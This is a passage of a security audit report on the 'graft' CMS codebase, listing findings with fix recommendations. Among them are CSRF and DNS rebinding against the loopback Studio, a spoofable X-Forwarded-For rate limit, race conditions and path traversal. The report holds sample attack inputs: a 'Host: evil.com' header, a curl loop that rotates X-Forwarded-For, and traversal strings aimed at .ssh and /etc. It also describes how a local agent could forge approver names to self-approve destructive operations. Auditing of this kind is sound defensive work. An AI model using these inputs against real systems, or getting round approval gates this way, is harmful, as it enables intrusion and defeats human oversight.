On loopback (the default) the authorize callback is left undefined (L74-81), and createStudioApiHandler treats that as unauthenticated access. The Studio surface includes highly privileged mutations reached with no credential: POST /api/studio/v1/approvals/:id/decide (approve/deny destructive operations), PUT /api/studio/v1/document (writes attacker-chosen frontmatter/body into MDX source files), /changes/commit (creates git commits), and /compilations/:id/revert (rewinds the content tree). There is no Origin/Sec-Fetch/Host check anywhere in the stack (createNodeListener imported from ./serve blindly trusts the Host header, and JSON bodies are parsed regardless of Content-Type), so (a) any co-resident process or compromised agent can silently self-approve its own pending destructive operations, and (b) a malicious webpage can issue no-cors cross-origin POSTs to http://127.0.0.1:4983/api/studio/v1/... whose side effects execute even though the response is opaque; DNS rebinding additionally yields read access to documents and pending approval inputs.

**Recommendation:** Validate Host against the bind address and reject cross-origin requests (Origin/Sec-Fetch-Site), or always require a bearer token for mutating endpoints (mint a per-process token, print it, and have the SPA send it). Consider separating read and write authorization so approval decisions are never unauthenticated.

---

### Client-supplied decidedBy overrides the operator identity Studio stamps on approval decisions

- **File:** `packages/cli/src/commands/studio.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 89, 90
- **Slug:** other-audit-tampering
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Verified: studioCommand passes decidedBy: operatorName (L89-90) intending decisions to be attributed to the OS user, but createStudioApiHandler prefers the request body (payload.decidedBy?.trim() || operator(options)), so any client of the local Studio HTTP surface overrides the operator stamp. Since decideApproval's APPROVAL_SELF_DECISION guard compares requestedById against exactly this string, a local agent that filed an approval (requestedById 'graft-cli'/null) approves it by posting any different name — e.g. the OS username itself — fully bypassing the advertised separation of duties, and the forged approver lands in decided_by while only decided_role is tamper-proof. This is the same underlying api.ts behavior flagged in F4 but reached through a different mount point and file (graft studio vs graft serve), which the duplicate rules treat as separate findings. Exploit requires local reachability, which the loopback-unauthenticated mount (F8) guarantees. MEDIUM is right: integrity/audit forgery and gate bypass on the local surface, not remote RCE.

studioCommand passes decidedBy: operatorName (L89) as the identity recorded on approval decisions, but the mounted Studio API accepts decidedBy from the request body first (payload.decidedBy?.trim() || operator(options) in packages/studio/src/api.ts). Because decideApproval's separation-of-duties check compares requestedById against this client-chosen string, a requester (including a local agent driving the API) can bypass APPROVAL_SELF_DECISION by submitting any different name, and the audit trail records a forged approver. The server-side decided_role column is the only tamper-proof field.

**Recommendation:** Ignore client-provided decidedBy on the decide endpoint; derive it exclusively from the server-side operator identity configured at mount time (or the authenticated actor), treating any submitted value as a validation error.

---

### Unauthenticated shell redirect reflects attacker-controlled Host header in Location

- **File:** `packages/cli/src/commands/studio.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 92, 93
- **Slug:** other-open-redirect
- **Confidence:** low
- **Revalidation:** uncertain
- **Reasoning:** Mechanically confirmed: graft studio serves the SPA shell at /, and with ?branch absent createStudioHandler responds Response.redirect(url.toString(), 302) where url came from new Request(`http://${req.headers.host}${req.url}`) in serve.ts's createNodeListener — no Host allowlist exists anywhere, and the redirect fires outside /api/studio/v1 so no authorize callback applies (loopback mounts have none anyway). Host: evil.com therefore yields Location: http://evil.com/?branch=main. However, as with F7, I cannot construct a victim-facing attack from source alone: browsers emit the real Host, so the poisoned Location returns only to the attacker; exploitation needs an intermediary that caches redirects keyed by path while passing arbitrary Host headers, and under DNS rebinding the reflected redirect is useless (the Host is already the attacker's domain). It is a real missing-validation defect and the correct fix (host validation, no-store) also closes part of the rebinding exposure reported in F8/F10's siblings, but standalone exploitability is contingent on unverifiable deployment infrastructure — uncertain, with the finding's own low confidence being accurate.

graft studio serves the SPA shell at / and, when ?branch is absent, responds 302 to an absolute URL rebuilt from the request's Host header (via createNodeListener's new Request(`http://${req.headers.host}${req.url}`) in serve.ts plus Response.redirect(url.toString(), 302) in packages/studio/src/handler.ts). This redirect fires before any authorization (it is outside /api/studio/*), so any request with a poisoned Host — e.g. Host: evil.com — receives Location: http://evil.com/?branch=main. On hosted/proxied deployments where intermediaries may cache redirects, this enables redirect-cache poisoning; it also confirms the adapter has no Host allowlist, the root cause of the local DNS-rebinding exposure reported separately.

**Recommendation:** Reject requests whose Host does not match the configured bind host, or build the redirect target from configured base URL rather than request input, with Cache-Control: no-store on the redirect.

---

### Rate-limit identity taken from client-controlled x-forwarded-for header

- **File:** `packages/core/src/functions-handler.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 115, 117, 118, 208, 291
- **Slug:** rate-limit-bypass
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed at source: clientIp() (L115-118) returns the FIRST x-forwarded-for entry, which per XFF convention is the value appended first, i.e., supplied by the originating client whenever any proxy appends rather than replaces; x-real-ip is likewise trusted unvalidated. rateKey() (L231-233) uses this value verbatim for every anonymous caller, and countSince (db/src/audit.ts L51-63) is an unauthenticated-string-match COUNT against audit_log — no HMAC, no allowlist, no trusted-proxy depth anywhere in the repo. 'graft serve' mounts the handler on a raw node:http server (cli/src/commands/serve.ts), where headers arrive straight from the client socket, so even the flagship self-host path is fully spoofable; the serve.ts loopback warning covers auth, not header trust. Impact claims check out: the 60/min backstop installed by both serve.ts and the example routes is void; and for a function that is both public and destructive, anonymous callers pass the access stage (public:true) and reach the gate, where each ungated attempt INSERTs an approvals row (stores.approvals.request), enabling queue-flooding once the limiter is bypassed. The unit test at functions-handler.test.ts:422 confirms the implementation deliberately keys on the first entry. Concrete attack: curl loop with '-H x-forwarded-for: 10.0.0.<n>' yields unlimited invocations. MEDIUM stands.

clientIp() (L115-118) uses request.headers.get('x-forwarded-for').split(',')[0] — the leftmost entry, which per XFF convention is the value appended first, i.e., supplied by the client, not the trusted proxy. For anonymous callers this value IS the entire rate-limit identity (rateKey() -> `ip:${ip}`, L208/L226), so an attacker can send a unique x-forwarded-for value with every request ('ip:1.2.3.4', 'ip:1.2.3.5', ...) and receive an unlimited number of fresh buckets, completely defeating fn.rateLimit and options.rateLimit. x-real-ip is likewise trusted blindly when XFF is absent. There is no trusted-proxy count or allowlist anywhere in the repo. Concrete impact: 'graft serve' always installs a backstop { limit: 60, windowSeconds: 60 }, so every deployment is affected; public queries/mutations (and destructive functions exposed with custom access) can be invoked without bound, and each ungated attempt additionally inserts a row into the approvals table (L317), letting an attacker flood the human approval queue to bury malicious requests among spam or exhaust DB storage. Bypassing rate limits also removes the anti-brute-force/backstop control for any function relying on it.

**Recommendation:** Never use client-supplied header values directly as rate identity. Use the connection peer address provided by the platform/runtime, or take the rightmost entry added by infrastructure you control based on a configured trusted-proxy count (e.g., numProxies setting), and validate the extracted value looks like an IP. Alternatively, require authenticated actors for anything rate-sensitive and treat header-derived identities as untrusted hints.

---

### TOCTOU race in rate limiting: counter read before invocation, audit row written after completion

- **File:** `packages/core/src/functions-handler.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 288, 291, 382, 385
- **Slug:** other-race-condition
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** The code sequence is exactly as described: countSince (L291) reads prior audit rows; admission is decided immediately; fn.handler(ctx) then runs for the entire duration; and the current invocation's audit row is only inserted in the best-effort audit block after outcome.response is built. The db-backed store is stateless — countSince is a plain SELECT COUNT and record is a plain INSERT with no transaction, advisory lock, or reservation slot — so under READ COMMITTED there is no serialization between the check and the eventual write. N concurrent requests therefore all observe the same 'used' value and are admitted; even fast handlers leave a window spanning JSON parsing, Zod validation, access checks, and the handler itself, and rejected attempts equally fail to count until after the 429 response is constructed, contradicting the in-code invariant 'every attempt counts'. A burst of concurrent POSTs proportionally exceeds any configured limit (e.g., ~100 simultaneous against a 60/min endpoint largely succeed). This is a classic count-then-act TOCTOU, exploitable by anyone who can open parallel connections; MEDIUM is appropriate for a throttling-control defeat rather than an auth bypass.

The stateless rate limiter counts prior audit rows (stores.audit.countSince, L288-307) but the current invocation's audit row is only recorded after the function handler finishes and the response is built (options.audit !== false block, L382-395). Between the countSince SELECT and the eventual INSERT there is a window covering the entire handler execution. Firing N concurrent requests against a limited function means all N observe used < limit and are admitted — a burst bypass proportional to concurrency (e.g., 1000 simultaneous POSTs against a 60/min endpoint mostly succeed). Long-running handlers extend the blind window further. Even sequential-ish abuse gets a free multiplier of one extra admitted request per in-flight request. This partially defeats the documented invariant that 'every attempt counts'.

**Recommendation:** Reserve the slot atomically before executing the handler: insert a provisional audit row (or a dedicated counter row with INSERT ... ON CONFLICT ... RETURNING / conditional UPDATE increment) prior to invoking fn.handler, then update its status/duration afterward. A single INSERT-before-execute closes the race while keeping the store stateless.

---

### updateRecord read-merge-write race silently loses concurrent updates (TOCTOU)

- **File:** `packages/core/src/records.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 201, 211, 221, 222, 230, 237, 243, 247
- **Slug:** other-race-condition
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** updateRecord performs SELECT baseline (no .for('update'), no surrounding transaction), merges the patch in JavaScript over that stale snapshot ({...existing.data, ...patch}), and writes the FULL merged document back with a WHERE clause limited to id+branchId+collection — no version column, no updated_at predicate, no row lock. Under Postgres READ COMMITTED two interleaved invocations (realistic here: agents and humans moderating the same queue through typed functions) both read the same baseline, both merges succeed independently, and the second write silently erases the first caller's fields with no error to either side — precisely the approve-a-comment/advance-an-order primitive the doc comment advertises. The secondary observation is also correct: if deleteRecord removes the row between SELECT and UPDATE, the UPDATE affects zero rows, control reaches the mislabeled-unreachable `throw new Error("update returned no row")`, and the caller gets FUNCTION_EXECUTION_FAILED/500 instead of DOCUMENT_NOT_FOUND. No framework-level mitigation exists (records helpers are the only write path and none take locks). A concrete exploit is two concurrent updateRecord calls toggling status on the same record — one transition is silently reverted. MEDIUM fits: silent data loss, but requiring authenticated access to an update-bearing function.

updateRecord implements patch semantics as SELECT baseline (lines 201-211), merge the patch in JavaScript over the stored document (line 221), then write the FULL merged document back (line 237). There is no transaction, no SELECT ... FOR UPDATE row lock, and no optimistic-concurrency guard (version column or staleness predicate) in the final UPDATE's WHERE clause. Attack/error scenario: two authenticated callers (e.g. two moderators, or an agent and a human) invoke functions that call updateRecord on the same record concurrently. Both SELECTs read the same baseline document; each merges its own patch over that stale baseline; both full-document writes succeed. Last writer wins and the first caller's change is silently discarded — no error is returned to either side. This is exactly the primitive the doc comment advertises for state transitions ('approve a comment, advance an order'), where concurrent transitions are expected, so a lost update can revert an approval/rejection or roll back an order-status change without any signal. Secondary effect of the same window: if the row is deleted (deleteRecord) between the SELECT and the UPDATE, the UPDATE matches zero rows and control reaches line 247 — `throw new Error("update returned no row")`, which the comment incorrectly labels 'unreachable' — surfacing as FUNCTION_EXECUTION_FAILED/500 instead of DOCUMENT_NOT_FOUND.

**Recommendation:** Make the read-modify-write atomic. Preferred: wrap in a transaction and lock the row (SELECT ... FOR UPDATE) before merging; or use optimistic concurrency — add a version/updated_at column, carry the value read at SELECT time into the UPDATE's WHERE clause, and return DOCUMENT_NOT_FOUND/retryable-conflict when zero rows are affected instead of the raw Error. A JSONB-level patch (jsonb_set / || merge performed inside Postgres) would also close the window.

---

### Authentication on the remotely-deployable MCP HTTP handler is opt-in (requireActor defaults off)

- **File:** `packages/mcp/src/http.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 30, 34, 55, 58, 62, 70
- **Slug:** missing-auth
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified in http.ts: both `actor` and `requireActor` are optional interface fields, requireActor defaults to undefined/off, and when off an anonymous-resolved request falls through to the full tool surface (the `requireActor && actor.kind === 'anonymous'` check simply never fires). The handler's own header comment advertises embedding in internet-facing targets ('a Next.js route, a self-host container, Vercel Fluid, or a Worker'), yet unlike serve.ts/studio.ts — whose insecure-bind console.warn the project itself defines as the control — a library embedding gets no startup signal whatsoever. The mechanics that DO exist are correct (resolver throw → hard 401 with no downgrade; requireActor without a resolver fails closed), so this is an insecure-default exposure rather than a broken check, exactly as the finding frames it. Exploitation requires an operator to embed the handler somewhere reachable while leaving defaults — but that is the documented, copy-paste path, and the exposed surface includes put_asset's arbitrary-file-read and the decide_approval self-approval primitive. Medium severity is well-calibrated: real and exploitable in realistic deployments, but contingent on deployment choices the code invites rather than performs.

createGraftMcpHandler is explicitly designed to be embedded in internet-facing deployments ('a Next.js route, a self-host container, Vercel Fluid, or a Worker'), yet both `actor` and `requireActor` are optional and requireActor defaults to off. When omitted, every tool on the endpoint executes as anonymous: write_content performs authenticated-equivalent mutations (writes attacker-controlled MDX into the content tree and compiles it into the database — content injection/site defacement and disk-fill), delete_content files/consumes destructive-op approvals, put_asset exposes the arbitrary-file-read primitive found in server.ts, and list_approvals discloses pending approval contents (function names, full inputs, requester ids, correlation ids) to anyone. The insecure-bind warning that mitigates `graft serve`/`graft studio` (console.warn when binding beyond loopback without identity) does not exist for library embeddings — a deployer who copies the handler into a Next.js route gets no signal that auth must be switched on. The code that does exist is correct (TOKEN_INVALID is a hard 401, never downgraded to anonymous; requireActor without a resolver fails closed), so this is an insecure-default exposure rather than a broken check.

**Recommendation:** Make authentication mandatory unless the server is explicitly created in a local-dev mode (e.g. require an explicit `allowAnonymous: true` / loopback-only assertion to construct the handler without a resolver), or emit the same class of startup warning serve.ts prints. At minimum, refuse write-capable tools (write_content, put_asset, delete_content, run_function mutations) for kind === "anonymous" regardless of requireActor.

---

### listComments filters AFTER applying the row cap — attackers can censor all approved comments site-wide

- **File:** `packages/registry/registry/comments/graft/comments.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 63, 66
- **Slug:** other-logic-bug
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Registry copy is byte-for-byte the same pattern: listRecords caps at newest-N rows collection-wide (records.ts filters only branchId+collection, orders createdAt DESC), then the handler filters approved && pageSlug in JS afterwards. An anonymous attacker posting ≥100 pending comments (public postComment; rate identity is the spoofable first-XFF entry per functions-handler.ts clientIp()) censors every approved comment on every page from public listings until moderators purge spam — silent, no error surfaced. Even benign operation truncates older pages' comments once the collection exceeds the window. Same vulnerability class as F1 but a different file (registry primitive shipped to deployments), so not a duplicate under the per-file rule. MEDIUM is right: integrity/availability of UGC display without permanent data loss.

listComments fetches the newest `limit` rows across the ENTIRE collection (all pageSlugs, both approved and unapproved) via listRecords (line 63), and only afterwards filters in JS for `approved && pageSlug === ctx.input.pageSlug` (line 66). Two consequences: (1) An unauthenticated attacker can suppress every approved comment on every page by posting >=100 pending comments (rate-limited to 5/min, so ~20 minutes — or near-instantly given the spoofable rate identity in createFunctionsHandler, see related finding). Because ordering is newest-first, legitimate approved comments fall outside the scanned window and silently disappear from the public listing. (2) Even without an attacker, any page whose comments are older than the newest 100 records loses its comments entirely, so multi-page sites silently truncate. This breaks the function's core guarantee ('List approved comments for a page') and gives an anonymous attacker integrity/availability control over user-generated content display.

**Recommendation:** Push the predicates into the database query (WHERE approved = true AND page_slug = $page ORDER BY created_at DESC LIMIT n), e.g. extend listRecords with a `where` option or add a dedicated filtered read helper. Never cap rows before filtering.

---

### Public listComments query has no rate limit and attacker-controlled scan size

- **File:** `packages/registry/registry/comments/graft/comments.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 59, 61, 63
- **Slug:** rate-limit-bypass
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed at module level: listComments declares no rateLimit (unlike sibling postComment) and its optional limit is an unclamped bare z.number() flowing into Drizzle .limit(). As a query with no access rule it is anonymous-open by design. Whether a deployment adds a handler-wide backstop is wiring-dependent (the landing-page example wires 60/min; the finding acknowledges this hedge), but nothing constrains the scan DEPTH: one request with limit=1e9 forces a full-collection read plus Zod revalidation per row (parseStoredRow), repeatable up to the backstop rate — cheap CPU/memory amplification against a public endpoint. The finding's negative-value observation is actually accurate (Postgres rejects negative LIMIT → 500 noise), unlike F2's phrasing. True-positive; MEDIUM justified by the amplification combined with storable megabyte rows.

listComments is public (queries default open) and declares no `rateLimit`, unlike its sibling postComment. Its `limit` input is an unbounded z.number() chosen by the caller (line 61): each invocation makes listRecords scan up to `limit` rows (default 100, but the attacker can send e.g. 1000000000) and re-validate every row through Zod on read (parseStoredRow), giving cheap, repeatable CPU/database amplification against the deployment with no per-caller throttle. A negative value additionally passes LIMIT -1 to Postgres, which errors out as FUNCTION_EXECUTION_FAILED (500 noise).

**Recommendation:** Clamp limit server-side to a small maximum (e.g. min(input ?? 100, 200)), reject non-positive values, and attach a rateLimit to this function (or rely on a handler-wide default) once the rate-key issue below is fixed.

---

### postComment accepts arbitrarily large author/body/pageSlug values straight into Postgres

- **File:** `packages/registry/registry/comments/graft/comments.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 37, 42, 43, 44
- **Slug:** other-unbounded-input
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified: field.string()/field.text() compile to bare z.string() with no maximum (field.ts), for both the function inputs and the collection fields, and insertRecord stores parsed data verbatim into the unbounded jsonb data column with no truncation path. The declared mitigation really is only the 5/min rateLimit, whose anonymous bucket key is the client-supplied first X-Forwarded-For entry (functions-handler.ts clientIp()), making sustained oversized-row injection feasible via header rotation against self-hosted/directly-exposed deployments; Next App Router imposes no route-handler body limit. Same underlying weakness as F3 but in the registry file — not a duplicate under per-file rules. MEDIUM appropriate: storage bloat, no confidentiality/integrity breach.

postComment's inputs are built with field.string()/field.text(), which compile to bare z.string() with no max() (lines 42-44; same for the collection fields at lines 25-27). An anonymous caller can therefore store multi-megabyte rows per submission. The declared mitigation ('5/min per caller', line 37) is the only bound, and that identity is spoofable for anonymous callers (x-forwarded-for handling, see the createFunctionsHandler finding), making sustained storage bloat feasible against self-hosted deployments.

**Recommendation:** Add max-length constraints to the field definitions (e.g. author <= 80 chars, body <= 4000, pageSlug <= 200) so validation rejects oversized payloads before insert.

---

### placeOrder accepts unbounded items array, causing per-item sequential DB queries (DoS)

- **File:** `packages/registry/registry/commerce/graft/commerce.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 133, 99, 171, 174
- **Slug:** other-unbounded-input
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Fully confirmed in packages/registry/registry/commerce/graft/commerce.ts: items is a plain z.array() with no element cap (handler only rejects length===0), and loadProducts awaits one contentIndex.findFirst per unique slug inside a for-loop — invoked before any unknown/inactive-slug rejection, so a single anonymous request carrying e.g. 50,000 distinct bogus slugs (a ~1.5MB body; no body-size guard exists) executes 50,000 serial DB round-trips while holding a pooled connection, then fails with INPUT_VALIDATION_FAILED after the damage. The db handle is shared across functions/branches (createFunctionsHandler injects one pool), so a handful of such requests starves unrelated functions — concrete denial-of-service. Snapshot array also persisted verbatim, bloating data_records. The 10/min limit genuinely doesn't constrain per-request work. High-confidence true-positive; MEDIUM reasonable for a demo/template endpoint.

placeOrder is a public (anonymous-reachable) mutation. Its `items` input compiles to a plain z.array() with no maximum length (field.array has no cap; the handler only rejects length===0 at L145). loadProducts() then executes ONE SEQUENTIAL database query per unique slug (L99-108: `await ctx.db.query.contentIndex.findFirst(...)` inside a for-loop, invoked from L171-174). An anonymous attacker can submit a single request with tens of thousands of distinct productSlug values, forcing tens of thousands of serial round-trips while holding a pooled Postgres connection. Because the functions handler shares one db pool across all functions/branches, a handful of such requests exhausts connections and stalls unrelated functions (denial of service). Additionally, the full snapshot array is persisted verbatim via insertRecord, so each crafted order row can be arbitrarily large, bloating the data_records table. The 10/min rate limit does not constrain per-request work, so one request is sufficient.

**Recommendation:** Cap items.length (e.g. max 100) in the Zod schema or the handler, cap productSlug string length, and batch-load products with a single `inArray` query instead of one findFirst per slug.

---

### Anonymous rate limit for public placeOrder is keyed on spoofable X-Forwarded-For

- **File:** `packages/registry/registry/commerce/graft/commerce.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 127
- **Slug:** rate-limit-bypass
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified precisely: functions-handler.ts clientIp() returns forwarded.split(",")[0] — the FIRST XFF entry — and the anonymous rateKey is ip:<that value>; the package's own test locks in this behavior. Under standard reverse-proxy append semantics the first entry is the attacker-supplied original value, so rotating the header mints a fresh bucket per request and fully defeats the 10/min control on public placeOrder; when directly exposed the header is entirely attacker-chosen too. Only platforms that overwrite XFF with the real client IP mitigate it. This removes the sole throttle on an anonymous ordering endpoint, enabling pending-order spam into data_records and amplifying F9. Topology-dependent but objectively a broken trust boundary in the framework code; medium confidence and MEDIUM severity are both correct.

placeOrder's declared control is '10/min per caller' (rateLimit at L127). In createFunctionsHandler (packages/core/src/functions-handler.ts), clientIp() resolves the anonymous rate identity from `request.headers.get("x-forwarded-for").split(",")[0]` — the FIRST entry, which is client-supplied whenever an intermediary proxy appends to the header (the standard behavior). An attacker rotating X-Forwarded-For values gets a fresh `ip:<value>` rate bucket per request, fully bypassing the limit. This removes the only throttle on the public ordering endpoint, amplifying the unbounded-items DoS above and allowing unbounded pending-order spam into the orders collection.

**Recommendation:** Use the last XFF entry or socket address, or make the trusted-proxy hop count configurable; alternatively key anonymous limits on a connection-level IP injected by the platform rather than a client-readable header.

---

### Manifest-controlled file targets/sources written and read without containment check

- **File:** `packages/registry/src/add.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 97, 98, 117, 185
- **Slug:** path-traversal
- **Confidence:** low
- **Revalidation:** ~~false positive~~
- **Reasoning:** The code-level description is accurate: planAdd reads join(item.dir, file.source), computes join(targetDir, file.target), reads join(item.dir, item.llms), and applyPlan writes via writeFileSync(file.targetPath) with no containment assertion, and registryFileSchema validates only z.string().min(1). However, exploitation requires attacker control over a manifest, and no shipping path provides it: registryRoot() resolves the @usegraft/registry package's own install directory via import.meta.url, every production consumer (cli add.ts, graft mcp, graft serve) uses that default (the root/registryRoot options exist for tests), and resolveItems' registryDependencies resolve against the same trusted root. Additionally, once loadItem succeeds, the item dir is provably contained because the manifest name must match the kebab-case regex AND equal the directory argument, which traversal strings cannot. The only way to influence source/target/llms is to modify files inside node_modules/@usegraft/registry — local write access that already implies arbitrary code execution in-process, making this path strictly weaker than existing trust. The finding self-describes as latent hardening ahead of a planned remote registry, which is a valid engineering recommendation, but under 'real AND exploitable with a concrete attack' it does not qualify today; the mitigation is that manifests are immutable, vendored, trusted package content.

planAdd builds each destination as join(targetDir, file.target) (L98), reads source content via join(item.dir, file.source) (L97) and llms fragments via join(item.dir, item.llms) (L117), and applyPlan persists them with writeFileSync(file.targetPath, ...) (L185). The governing schema in manifest.ts validates target/source/llms only as non-empty strings — nothing rejects absolute paths, '..' segments, backslashes, or null bytes — so a manifest entry with target '../../.ssh/authorized_keys' would write outside the project root, and a 'source' pointing anywhere under item.dir resolution escapes the item directory. Mitigating context: registry items currently ship bundled inside the @usegraft/registry package (trusted vendor content, loaded from registryRoot()), so this is not exploitable by an external attacker today; however registry.ts:6 documents that a remote HTTP registry is the planned evolution of loadItem, at which point any malicious or compromised item gains arbitrary file write/read relative to the victim project during `graft add`. Flagged as a latent trust-boundary gap to close before that switch.

**Recommendation:** Enforce containment at the trust boundary: reject absolute paths, '..' segments, backslashes, and null bytes in the Zod schema (or require targets under role-specific prefixes such as graft/, components/), and after computing targetPath/sourcePath in planAdd assert path.relative(targetDir, targetPath) does not start with '..' before any read/write.

---

### Registry manifest path fields lack containment validation (schema-level root cause)

- **File:** `packages/registry/src/manifest.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 32, 34, 52
- **Slug:** path-traversal
- **Confidence:** low
- **Revalidation:** ~~false positive~~
- **Reasoning:** The schema observation is correct — registryFileSchema.source/.target (manifest.ts L32/L34) and llms (L52) are bare min(1) strings with no relative-path or '..' rejection, and they flow unchecked into filesystem joins in add.ts. But this is the same trust-boundary situation as F1 at the schema layer, and it is not currently reachable by any attacker: manifests are read exclusively from registry.item.json files inside the @usegraft/registry package directory (registryRoot() via import.meta.url), no production caller supplies an alternative root (CLI add passes only targetDir; graft mcp / graft serve leave registryRoot unset), and transitive registryDependencies resolve against the same trusted location. An attacker able to place a crafted manifest there already has local filesystem write access and could simply edit the package's JS directly for full code execution, so the missing validation grants nothing beyond established compromise. Cross-file note: this is the schema-level half of the same latent gap flagged in add.ts, but per the rules cross-file findings are judged independently — both stand or fall on reachability, and neither is exploitable today. The recommendation remains sound pre-hardening for the documented future remote-registry evolution, but the verdict against shipped code is not-exploitable.

registryFileSchema accepts source and target as any non-empty string (L32, L34) and llms likewise (L52); there is no validation rejecting absolute paths, '..' segments, backslashes, or null bytes. These values flow directly into filesystem operations in add.ts: readFileSync(join(item.dir, file.source)) (L97), targetPath = join(targetDir, file.target) then writeFileSync (L98/L185), and readFileSync(join(item.dir, item.llms)) (L117). A manifest with target '../../outside-project/file' therefore reads/writes arbitrary locations relative to the project root. Currently mitigated by trust: manifests ship bundled inside the @usegraft/registry npm package, so exploitation would require a compromised package — at which point the attacker already controls executed code. However, registry.ts explicitly anticipates swapping in a remote HTTP registry ('the manifest shape is already the wire format'), making this schema the natural enforcement point before that data source becomes remotely influenceable.

**Recommendation:** Validate path fields in the Zod schema: require relative paths (no leading '/' or drive letters), reject '..' segments, backslashes, and null bytes (e.g., refine on a normalized split('/').every(seg => seg !== '..')), and optionally constrain target per role (module -> graft/<name>.ts, component -> components/**). Pair with a post-join containment assertion at the sinks in add.ts.

---

### loadItem joins unvalidated item name onto registry root (filesystem probe primitive)

- **File:** `packages/registry/src/registry.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 40, 58, 77
- **Slug:** path-traversal
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified end-to-end: mcp/src/server.ts L539 registers describe_item with inputSchema name: z.string() and passes it raw into loadItem(name, options.registryRoot), where L40 does join(root, name) with zero validation before existsSync(join(dir, 'registry.item.json')). The three observable outcomes are genuinely distinguishable through guarded()/fail(), which serializes the full GraftError message to the MCP client: NOT_FOUND (message reflects the traversal string plus available items), REGISTRY_ITEM_INVALID from JSON.parse whose V8 error message embeds a snippet of the probed file's content, and schema-validation failure — giving a filesystem existence and content-shape oracle for <any-traversable-dir>/registry.item.json using fully client-controlled input. This is concretely reachable by any local MCP client, and unauthenticated MCP is an explicit threat-model case when requireActor is off (the default dev posture). Impact is correctly bounded in the finding: installing an out-of-root item is impossible because parsed.data.name must satisfy the kebab-case regex and equal the directory argument, which traversal strings containing '/' can never do, and the server runs locally — so this degrades to information disclosure/recon rather than write primitive. Real, exploitable as described, with modest impact; the proposed kebab-case validation at the top of loadItem is the right fix.

const dir = join(root, name) (L40) uses the caller-supplied name verbatim. This is reachable with fully client-controlled input: the MCP tool describe_item passes its raw z.string() argument straight through (packages/mcp/src/server.ts:539 describeItem(loadItem(name, options.registryRoot))), and resolveItems does the same for CLI names and registryDependencies. A name like '../../../../etc' makes existsSync probe <anywhere>/registry.item.json, and the three error branches leak distinguishing information about what exists there: NOT_FOUND (L42-50) vs JSON-parse failure whose message embeds parser output from the probed file (L58: e.g., 'Unexpected token h in JSON at position 0') vs schema-validation failure. That yields a filesystem existence/content-shape oracle plus reflection of the traversal string in error details. Importantly, actual loading of an out-of-root manifest IS blocked: parsed.data.name must satisfy the kebab-case regex and equal the directory argument (L77-84), which traversal strings can never do — so this degrades to information disclosure rather than arbitrary item installation. Impact is bounded further by the MCP server running locally on the developer's machine, but the unauthenticated-MCP threat mode (GRAFT_MCP_REQUIRE_AUTH off) still exposes the oracle to any local client.

**Recommendation:** Validate name against the same kebab-case pattern used in the manifest schema (/^[a-z0-9]+(?:-[a-z0-9]+)*$/) at the top of loadItem (and before visit() in resolveItems), throwing REGISTRY_ITEM_INVALID for anything else; additionally assert path.relative(root, dir) does not start with '..' after joining.

---

### Cross-site request forgery against the unauthenticated loopback Studio can decide approvals, commit content and trigger compiles

- **File:** `packages/studio/src/api.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 425, 468, 540, 551
- **Slug:** other-csrf
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified the absence of every relevant defense. Case-insensitive search across packages/studio/src finds no Origin/Referer/Sec-Fetch validation, no CSRF token, no CORS headers, and no Content-Type enforcement on any API route; handlers call request.json() directly, and undici's Request.json() parses regardless of Content-Type, so cross-origin 'simple requests' with text/plain JSON bodies execute without preflight. State-changing routes reachable this way include compile (no id needed), changes/commit, document PUT, revert, and approvals/<id>/decide (api.ts L425, L468, L540, L650, L575). On loopback mounts authorize is deliberately undefined in both studio.ts and serve.ts, so no credentials are needed. The Host-header claim also checks out: createNodeListener builds the Request URL from `req.headers.host` verbatim (serve.ts), enabling DNS rebinding for full read+write access (list approvals, then decide them by id). Honest caveat: modern Chrome's Private Network Access blocks public-page→loopback subresources unless a PNA preflight passes, and pure blind CSRF cannot read UUID approval/compilation ids — but Firefox/Safari lack equivalent enforcement today, blind writes (compile trigger, guessed-slug document PUT feeding F9's render execution) work everywhere, and rebinding defeats IP-based PNA classification. Medium severity is correct.

